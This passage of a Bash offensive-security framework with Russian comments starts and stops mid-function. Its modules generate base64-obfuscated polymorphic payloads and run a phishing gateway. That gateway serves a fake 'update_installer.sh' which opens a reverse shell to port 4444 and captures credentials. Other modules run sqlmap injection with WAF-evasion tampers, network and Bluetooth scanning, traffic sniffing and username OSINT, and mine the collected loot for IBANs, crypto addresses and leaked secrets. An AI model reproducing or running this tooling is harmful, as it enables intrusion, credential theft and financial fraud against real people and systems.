    local key=$(tr -dc 'A-Za-z0-9' < /dev/urandom | head -c 16)
    
    # 2. Создаем "Мусорный код" для изменения хеш-суммы
    local junk="# $(date +%s) | $(tr -dc 'a-z' < /dev/urandom | head -c 32)"

    # 3. Применяем Base64 (динамическая обфускация)
    local encoded=$(echo -n "$raw_payload" | base64 | tr -d '\n')
    
    # Сборка финального стелс-файла
    {
        echo "#!/bin/bash"
        echo "$junk"
        echo "K=\"$key\""
        echo "echo \"$encoded\" | base64 -d | bash"
    } > "$output_file"

    chmod +x "$output_file"

    # Слой 3: Финальный отчет без мусора
    core_engine_ui "line" ""
    core_engine_ui "s" "Polymorphic Payload Secured"
    echo -e "${B}Path:${NC} $output_file"
    echo -e "${Y}Signature:${NC} $(sha256sum "$output_file" | awk '{print $1}')"
    core_engine_ui "line" ""
    
    # Регистрация артефакта в Сборщике трофеев [11]
    core_engine_loot "payload" "Generated poly-payload for $lhost:$lport"

    # Один финальный wait, чтобы пользователь успел скопировать путь
    core_engine_wait
}


# ==============================================================================
# @description: Модуль сбора системной информации и разведки вебхуков (RECON v2.6)
# ==============================================================================
run_system_info() {
    clear
    # Слой 1: Заголовок через компоненты интерфейса Ядра
    core_engine_ui "h" "PRIME INTELLIGENCE & RECON v2.6"

    # Слой 2: Построение интерактивного меню выбора вектора разведки
    core_engine_item "1" "LOCAL" "System, USB, Cron & Webhooks"
    core_engine_item "2" "REMOTE" "Deep Recon & Webhook Discovery"
    core_engine_item "B" "BACK" "Return to Main Menu"
    core_engine_ui "line" ""
    
    local choice=$(core_engine_input "select" "Target Type")
    [[ -z "$choice" || "$choice" == "b" || "$choice" == "B" ]] && return

    case "$choice" in
        "1") # --- ВЕКТОР 1: LOCAL (Анализ локального хоста) ---
            clear
            core_engine_ui "h" "RECON: LOCAL SERVICE INTELLIGENCE"
            core_engine_ui "i" "Analyzing Local Services & Active Runtimes..."
            
            # Проверка локальных слушателей с использованием глобальной сигнатуры сред исполнения
            local listeners=$(lsof -nP -iTCP -sTCP:LISTEN | grep -E "$GLOBAL_SIG_WEB_RUNTIMES" || echo "No local web-listeners active.")
            
            echo -e "\n${Y}--- LOCAL EVENT LISTENERS ---${NC}"
            echo -e "${W}$listeners${NC}"
            ;;

        "2") # --- ВЕКТОР 2: REMOTE (Внешняя разведка инфраструктуры) ---
            clear
            core_engine_ui "h" "RECON: REMOTE INFRASTRUCTURE SURFACE"
            
            # Проверка базовых зависимостей ядра перед сетевым сканированием
            core_engine_validator "pkg" "curl" "curl" || return
            
            local r_target=$(core_engine_input "text" "Enter Target (domain.com)")
            [[ -z "$r_target" ]] && return

            core_engine_ui "w" "Executing Multi-Vector Reconnaissance on $r_target..."
            core_engine_progress 2 "SCANNING_RESOURCES"
            sleep 1

            # 1. Пассивный сбор HTTP-заголовков с использованием глобального User-Agent
            local headers=$(curl -Is --connect-timeout 5 -L -A "$GLOBAL_NETWORK_UA" "$target" 2>/dev/null)
            local php_ver=$(echo "$headers" | grep -Ei "X-Powered-By" | cut -d' ' -f2- | tr -d '\r')
            
            # 2. АКТИВНЫЙ ФАЗЗИНГ WEBHOOKS & API (Перебор глобального словаря ядра)
            core_engine_ui "line" ""
            core_engine_ui "i" "Probing for Webhook & API endpoints..."
            
            local webhook_hits=""
            for hook in "${GLOBAL_WEBHOOK_WORDLIST[@]}"; do
                echo -ne " [.] Тестирование точки: /$hook\r"
                
                # Запрос к эндпоинту
                local code=$(curl -o /dev/null -s -w "%{http_code}" --connect-timeout 3 -A "$GLOBAL_NETWORK_UA" "http://$r_target/$hook")
                
                # 405 (Method Not Allowed), 401 (Unauthorized) или 200/403 означают, что эндпоинт существует!
                if [[ "$code" == "200" || "$code" == "405" || "$code" == "401" || "$code" == "403" ]]; then
                    webhook_hits+="${G}[!] DETECTED:${NC} /$hook (Status: $code)\n"
                fi
            done
            # Очищаем строку прогресса в терминале
            echo -ne "                                                                          \r"
            
            # 3. WHOIS & Нахождение IP-адреса целевого хоста
            local target_ip=$(host "$r_target" 2>/dev/null | awk '/has address/ {print $4}' | head -n1)

            # --- ИНТЕЛЛЕКТУАЛЬНЫЙ СИНТЕЗ И ВЫВОД ОТЧЕТА ---
            core_engine_ui "line" ""
            echo -e "${Y}--- REMOTE INTELLIGENCE REPORT ---${NC}"
            echo -e "${B}Target IP:${NC} ${W}${target_ip:-Unknown}${NC}"
            echo -e "${B}Runtime:${NC}   ${G}${php_ver:-Unknown / Hidden}${NC}"
            core_engine_ui "line" ""
            
            echo -e "${B}Webhook & API Surface:${NC}"
            if [[ -n "$webhook_hits" ]]; then
                echo -e "$webhook_hits"
                core_engine_ui "w" "Анализ: Обнаружены активные слушатели. Зафиксирована интеграция со сторонними сервисами."
                core_engine_loot "recon" "Для цели $r_target обнаружены активные API эндпоинты."
            else
                core_engine_ui "e" "Распространенных эндпоинтов вебхуков не обнаружено."
            fi
            ;;
    esac

    core_engine_ui "line" ""
    core_engine_ui "s" "Diagnostic complete."
    core_engine_wait
}



# --- Анализ Bluetooth устройств ---
run_bluetooth_scan() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "BLUETOOTH RADAR"
    
    # 2. Проверка инструментов через Мозг [5]
    if ! core_engine_validator "pkg" "bluez" "Bluetooth Engine"; then
        if [[ $(id -u) -eq 0 ]]; then
            core_engine_ui "w" "Root detected. Deploying 'bluez' core..."
            core_engine_run "apt-get update && apt-get install bluez -y" "Installing bluez"
        else
            core_engine_ui "!" "Non-Root environment (Samsung A14?)."
            core_engine_ui "i" "Manual action: apt update && apt install bluez"
            core_engine_wait && return
        fi
    fi

    # 3. Активация интерфейса (только для Root/Wiko) [5]
    if [[ $(id -u) -eq 0 ]]; then
        core_engine_ui "Activating Bluetooth Interface..."
        hciconfig hci0 up >/dev/null 2>&1
    fi

    # 4. Визуализация процесса через Синхронизацию [13]
    core_engine_ui "Initializing BlueZ Stack..."
    core_engine_progress 3 "SCANNING PROXIMITY SPECTRUM"
    
    core_engine_ui "!" "Searching for active signals..."
    
    # 5. Исполнение через Глушитель [7]
    local scan_out
    scan_out=$(hcitool scan 2>/dev/null)

    if [[ -z "$scan_out" || "$scan_out" == *"Scanning"* ]]; then
        core_engine_ui "e" "No devices found or Adapter blocked."
        
        # Эвристическая подсказка (Samsung A14 / Non-Root)
        [[ $(id -u) -ne 0 ]] && core_engine_ui "w" "Note: Direct BT access restricted on Non-Root."
    else
        # Чистый вывод без заголовка "Scanning..."
        echo -e "$scan_out" | grep -v "Scanning"
        core_engine_ui "+" "Scan completed."
        
        # 6. Сбор трофеев через узел [11]
        core_engine_loot "bluetooth" "BT Scan Results:\n$scan_out"
    fi
    
    core_engine_wait
}


# ==============================================================================
# @description: Центральный мост консолидации сигналов и эвристического декодинга
# ПОЛНАЯ АВТОНОМИЯ: Безусловный цикл обработки логов без интерактивных пауз
# ==============================================================================
run_deep_bridge() {
    clear
    # Слой 1: Заголовок через компоненты интерфейса Ядра
    core_engine_ui "h" "PRIME BRIDGE: NEURAL INTELLIGENCE LINK v2.6 (AUTONOMOUS)"
    
    # Синхронизация путей согласно глобальной архитектуре фреймворка
    local loot_dir="${BASE_DIR:-./}/prime_loot"
    local master_loot="$loot_dir/master_intelligence.log"
    mkdir -p "$loot_dir"
    
    # Бесконечный цикл автономного мониторинга входящих сигналов
    while true; do
        local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
        local pool="/tmp/bridge_pool_$RANDOM.tmp"
        
        # --- СЛОЙ 1: КОНСОЛИДАЦИЯ СИГНАЛОВ (Изоляция от циклической записи) ---
        if ls "$loot_dir"/*.log &>/dev/null; then
            touch "$master_loot"
            sort -u "$loot_dir"/*.log 2>/dev/null | grep -v '^$' | grep -v "master_intelligence" > "$pool"
        fi
        
        # Безусловная проверка пула без использования тяжелых конструкций IF
        [[ ! -s "$pool" ]] && { 
            core_engine_ui "w" "[$timestamp] Ожидание сигналов разведки... База трофеев чиста."
            rm -f "$pool"
            sleep 15  # Автономная пауза ожидания перед новым кругом проверки
            continue
        }

        local total_threads=$(wc -l < "$pool")
        core_engine_ui "line" ""
        core_engine_ui "i" "[$timestamp] Анализ $total_threads активных потоков метаданных..."
        core_engine_ui "w" "Контур: Автопилот моста. Для остановки нажмите [CTRL+C]"
        core_engine_ui "line" ""
        
        core_engine_progress 3 "DECODING_INTELLIGENCE_POOL"

        # --- СЛОЙ 2: ЭВРИСТИЧЕСКИЙ ДЕКОДЕР ЯДРА ---
        while read -r line; do
            [[ -z "$line" ]] && continue
            
            # Очистка входящей строки от технического шума и разделителей
            local raw_data=$(echo "$line" | awk -F ' -> ' '{print $2}' | xargs || echo "$line")
            
            # 1. Детекция криптографических хэшей через глобальные регулярки ядра
            if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_HASH_MD5"; then
                core_engine_ui "y" "RESONANCE: Обнаружен хэш-артефакт MD5 -> $raw_data"
                continue
            fi
            if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_HASH_SHA256"; then
                core_engine_ui "y" "RESONANCE: Обнаружен хэш-артефакт SHA-256 -> $raw_data"
                continue
            fi

            # 2. Финансовый сектор: Детекция валидных IBAN через глобальную регулярку
            if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_FIN_IBAN"; then
                core_engine_ui "s" "RESONANCE: Финансовый актив (IBAN) верифицирован -> $raw_data"
                continue
            fi

            # 3. УЛЬТИМАТИВНЫЙ КРИПТО-КОНТУР: Динамический перебор матрицы GLOBAL_CRYPTO_TYPES
            local crypto_matched=0
            for crypto_entry in "${GLOBAL_CRYPTO_TYPES[@]}"; do
                # Расщепляем элемент матрицы на регулярное выражение и описание сети
                local regex_pattern="${crypto_entry%%|*}"
                local crypto_desc="${crypto_entry#*|}"
                
                if echo "$raw_data" | grep -qE "$regex_pattern"; then
                    core_engine_ui "s" "RESONANCE: Блокчейн-след ($crypto_desc) зафиксирован -> $raw_data"
                    crypto_matched=1
                    break
                fi
            done
            [[ "$crypto_matched" -eq 1 ]] && continue

            # 4. Анализ утечек идентификаторов через глобальные сигнатуры форензики
            if echo "$raw_data" | grep -qiE "$GLOBAL_SIG_FORENSIC_CONFIG"; then
                core_engine_ui "w" "RESONANCE: Критическая утечка учетных данных / Secret Leak"
                continue
            fi

            # 5. Инфраструктурный анализ скрытых сетей (Dark Web Gateways)
            if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_DARKWEB"; then
                core_engine_ui "e" "RESONANCE: Обнаружена скрытая точка маршрутизации Dark Web"
                continue
            fi

        done < "$pool"

        # --- СЛОЙ 3: СИНХРОНИЗАЦИЯ И САНИТАРНАЯ ОЧИСТКА ---
        cat "$pool" >> "$master_loot"
        rm -f "$pool"
        
        core_engine_ui "line" ""
        core_engine_ui "s" "Синхронизация потоков нейро-моста успешно завершена. Ожидание..."
        
        # Засыпаем на 30 секунд перед следующей итерацией консолидации логов
        sleep 30
    done
}

# --- Сетевое мапирование (Network Mapper) ---
# ==============================================================================
# @description: Модуль комплексного сетевого аудита, маппинга и захвата пакетов
# Интегрирован под ультимативные матрицы сканирования периметра (Linux / Termux)
# ПОЛНАЯ АВТОНОМИЯ: Безбарьерный линейный запуск без интерактивного меню
# ==============================================================================
run_network_analyzer() {
    clear
    # Слой 1: Заголовок через компоненты интерфейса Ядра
    core_engine_ui "h" "NETWORK INTELLIGENCE & TOPOLOGY v5.0 (AUTONOMOUS)"
    core_engine_ui "!" "Инициализация автоматического сетевого контура..."

    # Бронированный многоуровневый парсинг локального IP адреса подсети
    # Исключаем петлю локального хоста на базе глобального регулярного выражения ядра
    local local_ip=""
    local_ip=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+')
    
    if [[ -z "$local_ip" ]]; then
        # Фолбэк-вариант 2: извлечение через ip addr (актуально для Termux/Android)
        local_ip=$(ip addr show 2>/dev/null | grep -w "inet" | grep -vE "$GLOBAL_REGEX_NET_LOOPBACK" | head -n 1 | awk '{print $2}' | cut -d/ -f1)
    fi
    if [[ -z "$local_ip" ]]; then
        # Фолбэк-вариант 3: старый добрый ifconfig
        local_ip=$(ifconfig 2>/dev/null | grep -w "inet" | grep -vE "$GLOBAL_REGEX_NET_LOOPBACK" | head -n 1 | tr -s ' ' | cut -d' ' -f3)
    fi

    # Формируем целевой диапазон /24 на основе полученного IP
    local range=""
    if [[ -n "$local_ip" ]]; then
        range=$(echo "$local_ip" | cut -d. -f1-3)".0/24"
    else
        # Если сеть изолирована или девайс в офлайне — берем глобальный дефолт
        range="$GLOBAL_NET_FALLBACK_RANGE"
    fi
    
    core_engine_ui "s" "Определен целевой диапазон сканирования: $range"
    core_engine_progress 2 "AUTONOMOUS MAPPING INITIALIZATION"

    # Бесконечный цикл автономного сканирования периметра
    while true; do
        local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
        core_engine_ui "line" ""
        core_engine_ui "i" "[$timestamp] Запуск цикла разведки периметра..."
        core_engine_ui "w" "Режим: Автопилот. Для принудительной остановки нажмите [CTRL+C]"
        core_engine_ui "line" ""
        
        # Гибридный движок: интеллектуальная подстановка мощных глобальных матриц аргументов
        local nmap_cmd="nmap"
        if [[ $(id -u) -eq 0 ]]; then
            nmap_cmd+=" $GLOBAL_NMAP_ROOT_ARGS"
        else
            # Режим Non-Root: безопасный TCP-Connect без вызова Raw Sockets во избежание Kernel Lock
            nmap_cmd+=" $GLOBAL_NMAP_NON_ROOT_ARGS"
        fi
        
        # Выполнение сканирования с перехватом сырого текстового потока
        local raw_scan=""
        raw_scan=$($nmap_cmd "$range" 2>/dev/null)
        
        if [[ -n "$raw_scan" ]]; then
            local current_host=""
            local host_detected_flag=0

            # Построчный эвристический разбор вывода nmap через глобальные паттерны-фильтры
            while read -r line; do
                [[ -z "$line" ]] && continue
                
                # Триггер 1: Обнаружение заголовка нового хоста в потоке через внешнюю матрицу
                if echo "$line" | grep -qEi "$GLOBAL_REGEX_NET_REPORT"; then
                    current_host=$(echo "$line" | awk '{print $NF}' | tr -d '()')
                    core_engine_ui "s" "HOST TARGET: [ONLINE] -> $current_host"
                    host_detected_flag=1
                    continue
                fi
                
                # Триггер 2: Перехват строк с открытыми портами и сигнатурами запущенных служб
                if echo "$line" | grep -qEi "$GLOBAL_REGEX_NET_PORT_LINE"; then
                    core_engine_ui "y" "   └── SERVICE: $line"
                fi
            done <<< "$raw_scan"
            
            [[ "$host_detected_flag" -eq 0 ]] && core_engine_ui "w" "Активные узлы в диапазоне $range не ответили на сетевые маркеры."
        else
            core_engine_ui "e" "Критический сбой выполнения бинарного файла nmap. Проверка окружения..."
        fi
        
        # Интервал между циклами сканирования (60 секунд), чтобы не перегружать стек сети
        sleep 60
    done
}

run_phantom_engine() {
    clear
    core_engine_ui "h" "PRIME PHANTOM FRAMEWORK"

    # Используем системные переменные ядра
    local local_ip=$(ip route get 1.2.3.4 | awk '{print $7}' | head -n1)
    local my_host="${HOSTNAME:-localhost}"
    local srv_path="/tmp/phantom_srv.py" # Перенесли в /tmp для стерильности
    local payload_name="update_installer.sh"
    local payload_path="$PRIME_LOOT/$payload_name"

    # Выбор стратегии через компактный ввод
    core_engine_ui "i" "Select Attack Strategy:"
    echo -e " 1) Credential Capture"
    echo -e " 2) Full Hybrid (Creds + Payload)"
    echo -e " 3) Cancel"
    
    local choice=$(core_engine_input "select" "Strategy")
    [[ "$choice" == "3" || -z "$choice" ]] && return

    local attack_type="creds"
    [[ "$choice" == "2" ]] && attack_type="hybrid"

    # --- ФАЗА ГЕНЕРАЦИИ (БЕЗ ЛЕСТНИЦЫ) ---
    core_engine_progress 1 "FORGING_PAYLOAD"
    
    # Создаем Payload
    cat <<EOF > "$payload_path"
#!/bin/bash
# System update for $my_host
echo 'Updating system components...'
bash -i >& /dev/tcp/$local_ip/4444 0>&1 &
EOF
    chmod +x "$payload_path"

    # --- ФАЗА АКТИВАЦИИ ---
    if command -v python3 >/dev/null; then
        # Генерируем код сервера (предполагаем, что функция существует)
        generate_phantom_server_code "$srv_path" "$attack_type" 2>/dev/null
        
        core_engine_ui "w" "Activating Phantom Gate on port 80..."
        # Тихая очистка порта
        fuser -k 80/tcp >/dev/null 2>&1
        
        # Запуск в фоне
        python3 "$srv_path" > /dev/null 2>&1 &
        
        core_engine_ui "s" "PHANTOM GATEWAY OPERATIONAL"
        
        # Информационная панель
        core_engine_ui "line" ""
        echo -e "${Y}--- Gateway Info ---${NC}"
        echo -e "${G} >> URL:${NC}      http://${local_ip}"
        echo -e "${G} >> Payload:${NC}  /${payload_name}"
        echo -e "${G} >> Strategy:${NC} ${attack_type}"
        core_engine_ui "line" ""
        
        # Фиксация в трофеях
        core_engine_loot "phantom" "Gateway active at http://$local_ip ($attack_type)"
    else
        core_engine_ui "e" "Python3 missing. Operation aborted."
    fi

    # Финальное ожидание (вместо pause)
    core_engine_wait
}


# ==============================================================================
# @description: Модуль адаптивного тестирования SQL-контуров
# Интегрирован под ультимативные матрицы ядра фреймворка
# АВТОПИЛОТ: Автоматическое выполнение и логирование сразу после ввода цели
# ==============================================================================
run_sql_adaptive() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "PRIME MUTAGEN: SQL INJECTION ENGINE v8.5"

    # Слой 2: Органы чувств [3] - Запрос цели
    local target_url=$(core_engine_input "text" "Enter Target URL")
    [[ -z "$target_url" ]] && return

    # Динамический выбор случайного User-Agent из глобальной матрицы UA
    local ua_size=${#GLOBAL_NETWORK_UA[@]}
    local random_index=$(( RANDOM % ua_size ))
    local selected_ua="${GLOBAL_NETWORK_UA[$random_index]}"

    # Слой 3: Эвристика и анализ WAF через Глушитель [7]
    core_engine_ui "i" "Probing WAF/IPS resistance layers..."
    # Подставляем динамически выбранный User-Agent из матрицы
    local waf_reaction=$(curl -s -o /dev/null -w "%{http_code}" -A "$selected_ua" "$target_url%27%20OR%201=1")
    
    # Слой 4: НЕЙРОННАЯ МУТАЦИЯ через узел [4]
    # Используем системный мутатор для генерации уникального агента
    local neural_agent="Prime-$(core_engine_mutate "agent" "neural")-$RANDOM"
    core_engine_ui "+" "Neural Header Generated: $neural_agent"

    # Слой 5: Адаптивное вычисление агрессии (Мозг [5])
    local aggr=$(( (waf_reaction / 100) ))
    [[ $aggr -lt 2 ]] && aggr=2 

    # Матрица тамперов (интегрирована в логику)
    local t_matrix
    case "$aggr" in
        2) t_matrix="between,randomcase" ;;
        4) t_matrix="between,charencode,space2comment,versionedmorekeywords" ;;
        *) t_matrix="between,charencode,space2comment,randomcase,percentage" ;;
    esac

    core_engine_ui "+" "Applying Neural Obfuscation: $t_matrix"

    # Слой 6: Исполнение и Сбор трофеев [11]
    # Используем временную директорию внутри структуры PRIME_LOOT
    local out_dir="${BASE_DIR:-./}/prime_loot/mutagen_$RANDOM"
    
    core_engine_ui "i" "Launching evolved payload stream..."
    
    # Запуск в фоне с подавлением мусора через Глушитель
    {
        sqlmap -u "$target_url" --batch --random-agent --user-agent="$neural_agent" \
        --smart --mobile --output-dir="$out_dir" --flush-session \
        --tamper="$t_matrix" --level=$aggr --risk=2 \
        --delay=$((aggr / 2)) --threads=1 >/dev/null 2>&1
    } &

    # Визуализация через Синхронизацию [13]
    core_engine_progress 15 "Neural-Evolving payload mutations"

    # Слой 7: Интеллектуальный синтез и логирование [11]
    local log_file=$(find "$out_dir" -name "log" 2>/dev/null)
    if [[ -f "$log_file" ]]; then
        core_engine_ui "+" "EXPLOIT SECURED: Findings integrated."
        
        # Структурированная запись в лут через Сборщик
        local findings=$(grep -Ei "Type:|Payload:|Parameter:" "$log_file")
        core_engine_loot "sql_success" "TARGET: $target_url\nAGGR: $aggr\n$findings"
    fi

    # Сигнал для моста [10]
    echo "[$(date)] SRC: $target_url | AGGR: $aggr" >> "${BASE_DIR:-./}/prime_loot/bridge_signals.log"
    
    # Очистка через Санитара [8]
    core_engine_remove "$out_dir"
}


# ==============================================================================
# @description: Модуль автоматического сбора сетевых данных и анализа трафика
# Интегрирован под ультимативные матрицы ядра фреймворка
# ПОЛНАЯ АВТОНОМИЯ: Динамический расчет таймингов + Фильтрация целевого трафика
# ==============================================================================
run_network_intelligence() {
    clear
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "h" "NETWORK INTELLIGENCE: TRAFFIC ANALYZER v6.0 (TARGETED AUTO)"
    
    # Слой 2: Проверка TShark через Мозг [5]
    if ! core_engine_validator "pkg" "tshark" "TShark Core"; then
        core_engine_ui "e" "Критический компонент TShark не найден. Выход."
        return
    fi

    # Слой 3: Авто-определение интерфейса через Метрики [12]
    local iface=$(ip route | grep default | grep -oP 'dev \K\S+' || echo "eth0")
    core_engine_ui "s" "Active interface detected: $iface"
    core_engine_ui "!" "Запуск параллельных контуров перехвата на автопилоте..."
    core_engine_ui "w" "Для завершения работы модулей зажмите [CTRL+C]"
    core_engine_ui "line" ""

    # Глобальный BPF-фильтр для TShark: пишем только сигналы, управляющие протоколы и сессии.
    # Отсекаем: весь потоковый DATA-трафик, видео, музыку, торренты, тяжелый TLS-содержимое.
    local targeted_bpf_filter="port 53 or port 80 or port 21 or port 23 or port 25 or port 110 or port 143 or (tcp[tcpflags] & (tcp-syn|tcp-fin|tcp-rst) != 0)"

    # Слой 4: Потоковый Sniffer — запуск в изолированном фоне
    {
        tshark -i "$iface" -Y "http.request || dns.flags.response == 0" -T fields -e http.host -e dns.qry.name 2>/dev/null \
        | stdbuf -oL awk NF | stdbuf -oL uniq | while read -r line; do
            core_engine_loot "traffic_leads" "IFACE: $iface | LEAD: $line"
        done
    } &
    local sniffer_pid=$!

    # Слой 5: Автономный цикл Traffic Record с динамической эвристикой и фильтрацией
    while true; do
        local timestamp=$(date "+%H%M")
        local date_stamp=$(date "+%Y-%m-%d %H:%M:%S")
        local filename="${BASE_DIR:-./}/prime_loot/capture_${timestamp}.pcap"
        
        # --- БЛОК ЭВРИСТИКИ (Интеллектуальный расчет нагрузки) ---
        core_engine_ui "i" "Анализ плотности целевого трафика..."
        
        # Считаем количество только целевых пакетов за 3 секунды тест-драйва
        local packet_count=$(tshark -i "$iface" -f "$targeted_bpf_filter" -a duration:3 -T fields -e frame.number 2>/dev/null | wc -l)
        local duration=300 # Дефолт-баланс
        local load_status="MEDIUM"

        if [[ "$packet_count" -gt 100 ]]; then
            duration=60
            load_status="HIGH (STORM)"
        elif [[ "$packet_count" -lt 15 ]]; then
            duration=900
            load_status="LOW (IDLE)"
        fi

        core_engine_ui "+" "Эвристика: Целевой трафик зафиксирован как $load_status ($packet_count пак/3сек)"
        core_engine_ui "i" "[$date_stamp] Запись отфильтрованной сессии в $(basename "$filename") на $duration сек..."
        
        # --- Исполнение целевой записи ---
        # Флаг -f применяет наш фильтр на уровне ядра захвата пакетов
        tshark -i "$iface" -f "$targeted_bpf_filter" -a duration:"$duration" -w "$filename" 2>/dev/null
        
        # Валидация результата через Мозг [5]
        if core_engine_validator "file" "$filename" "PCAP Archive"; then
            core_engine_ui "+" "Сессия целевого захвата сохранена и очищена от мусора."
            echo "[$date_stamp] SRC: run_network_intelligence | CAPTURE: $(basename "$filename") | DUR: ${duration}s | LOAD: $load_status | FILTER: TRUE" >> "${BASE_DIR:-./}/prime_loot/bridge_signals.log"
        else
            core_engine_ui "e" "Ошибка или пустой целевой поток при записи сессии."
        fi
        
        # Контроль жизнеспособности фонового потока
        if ! kill -0 $sniffer_pid 2>/dev/null; then
            {
                tshark -i "$iface" -Y "http.request || dns.flags.response == 0" -T fields -e http.host -e dns.qry.name 2>/dev/null \
                | stdbuf -oL awk NF | stdbuf -oL uniq | while read -r line; do
                    core_engine_loot "traffic_leads" "IFACE: $iface | LEAD: $line"
                done
            } &
            sniffer_pid=$!
        fi
    done
}

# ==============================================================================
# @description: Центральный мост консолидации сигналов и эвристического декодинга (run_deep_bridge)
# ==============================================================================
run_deep_bridge() {
    clear
    # Слой 1: Заголовок через компоненты интерфейса Ядра
    core_engine_ui "h" "PRIME BRIDGE: NEURAL INTELLIGENCE LINK v2.0"
    
    # Синхронизация путей согласно архитектуре фреймворка
    local loot_dir="$BASE_DIR/loot"
    local pool="/tmp/bridge_pool_$RANDOM.tmp"
    local master_loot="$loot_dir/master_intelligence.log"
    
    mkdir -p "$loot_dir"
    
    # --- СЛОЙ 1: КОНСОЛИДАЦИЯ СИГНАЛОВ (Изоляция от циклической записи) ---
    # Собираем данные изо всех логов, исключая мастер-лог из выборки во избежание конфликтов
    if ls "$loot_dir"/*.log &>/dev/null; then
        touch "$master_loot"
        sort -u "$loot_dir"/*.log 2>/dev/null | grep -v '^$' | grep -v "master_intelligence" > "$pool"
    fi
    
    # Безусловная проверка пула без использования тяжелых конструкций IF
    [[ ! -s "$pool" ]] && { 
        core_engine_ui "w" "Ожидание сигналов разведки... База трофеев чиста."
        rm -f "$pool"
        core_engine_wait
        return
    }

    local total_threads=$(wc -l < "$pool")
    core_engine_ui "i" "Анализ $total_threads активных потоков метаданных..."
    core_engine_ui "line" ""
    
    core_engine_progress 3 "DECODING_INTELLIGENCE_POOL"
    sleep 1

    # --- СЛОЙ 2: ЭВРИСТИЧЕСКИЙ ДЕКОДЕР ЯДРА ---
    while read -r line; do
        # Очистка входящей строки от технического шума и разделителей
        local raw_data=$(echo "$line" | awk -F ' -> ' '{print $2}' | xargs || echo "$line")
        
        # 1. Детекция криптографических хэшей через глобальные регулярки ядра
        if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_HASH_MD5"; then
            core_engine_ui "y" "RESONANCE: Обнаружен хэш-артефакт MD5 -> $raw_data"
            continue
        fi
        if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_HASH_SHA256"; then
            core_engine_ui "y" "RESONANCE: Обнаружен хэш-артефакт SHA-256 -> $raw_data"
            continue
        fi

        # 2. Финансовый сектор: Детекция валидных IBAN (Стратегия Банковский Гамбит)
        if [[ "$raw_data" =~ ^[A-Z]{2}[0-9]{2}[A-Z0-9]{11,30} ]]; then
            core_engine_ui "s" "RESONANCE: Финансовый актив (IBAN) верифицирован -> $raw_data"
            continue
        fi

        # 3. Финансовый сектор: Поиск следов крипто-транзакций (BTC / ETH)
        if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_CRYPTO_BTC"; then
            core_engine_ui "s" "RESONANCE: Блокчейн-след (Bitcoin Asset) зафиксирован."
            continue
        fi
        if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_CRYPTO_ETH"; then
            core_engine_ui "s" "RESONANCE: Блокчейн-след (Ethereum Asset) зафиксирован."
            continue
        fi

        # 4. Анализ утечек идентификаторов через глобальные сигнатуры форензики
        if echo "$raw_data" | grep -qiE "$GLOBAL_SIG_FORENSIC_CONFIG"; then
            core_engine_ui "w" "RESONANCE: Критическая утечка учетных данных / Secret Leak"
            continue
        fi

        # 5. Инфраструктурный анализ скрытых сетей (Dark Web Gateways)
        if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_DARKWEB"; then
            core_engine_ui "e" "RESONANCE: Обнаружена скрытая точка маршрутизации Dark Web"
            continue
        fi

    done < "$pool"

    # --- СЛОЙ 3: СИНХРОНИЗАЦИЯ И САНИТАРНАЯ ОЧИСТКА ---
    # Аппендим результаты анализа в главный исторический лог фреймворка
    cat "$pool" >> "$master_loot"
    rm -f "$pool"
    
    core_engine_ui "line" ""
    core_engine_ui "i" "Синхронизация потоков нейро-моста успешно завершена."
    core_engine_wait
}

suggest_action() {
    local func=$1
    local data=$2
    
    # Слой 1: Визуальный резонанс через Голос [1]
    # Показываем только первые 15 символов данных для чистоты экрана
    local preview="${data:0:15}..."
    
    # Слой 2: Запрос через Органы чувств [3] и Валидатор [5]
    # Используем желтый акцент для данных и белый для функции
    echo -en "${B}>>> Intelligence suggests ${W}$func${B} for: ${Y}$preview${NC} | "
    
    if core_engine_validator "read" "Execute?"; then
        # Слой 3: Исполнение через Глушитель [7]
        core_engine_ui "i" "Executing linked action: $func"
        $func "$data"
    else
        core_engine_ui "i" "Action bypassed. Data indexed."
    fi
}

# ==============================================================================
# @description: Высокоскоростной движок OSINT с каскадными API-матрицами v14.2
# ==============================================================================
run_smart_osint_engine() {
    clear
    core_engine_ui "h" "PRIME RECON: ULTIMATE OSINT CORE v14.2"

    # Ввод через стандартный input Ядра
    local INPUT=$(core_engine_input "text" "TARGET (Nick, Phone, Email, IP, or Domain)")
    [[ -z "$INPUT" ]] && return

    local raw_log="/tmp/prime_recon_$RANDOM.log"
    
    core_engine_progress 2 "OSINT_SCAN_INIT"

    # --- 1. SOCIAL SCAN (Если ввод — это никнейм) ---
    if [[ ! "$INPUT" =~ $GLOBAL_REGEX_EMAIL && ! "$INPUT" =~ $GLOBAL_REGEX_PHONE && ! "$INPUT" =~ $GLOBAL_REGEX_IP && ! "$INPUT" =~ $GLOBAL_REGEX_DOMAIN ]]; then
        core_engine_ui "i" "Scanning Social Signatures (Ghost Mode)..."
        
        local sites=("${GLOBAL_OSINT_SITES[@]}")
        local total_sites=${#sites[@]}
        local current_index=0

        for entry in "${sites[@]}"; do
            ((current_index++))
            local url="${entry%%|*}"
            local name="${entry#*|}"
            
            local progress
            progress=$(printf "[%02d/%02d]" "$current_index" "$total_sites")

            local status
            status=$(curl -s -o /dev/null -L -w "%{http_code}" -A "$GLOBAL_NETWORK_UA" "${url}${INPUT}" --connect-timeout 4)
            
            if [ "$status" == "200" ]; then
                echo "[+] FOUND on $name: ${url}${INPUT}" >> "$raw_log"
                core_engine_ui "s" "$progress Match confirmed: $name"
            else
                echo -ne " [.] Проверка: $progress $name...\r"
            fi
        done
        echo -ne "                                                       \r"
        
        local gh_api="${GLOBAL_API_IDENTITY_NODES[0]%%|*}"
        curl -s -A "$GLOBAL_NETWORK_UA" "${gh_api}${INPUT}" >> "$raw_log" 2>/dev/null
    fi

    # --- 2. PHONE INTEL (Если ввод — мобильный номер) ---
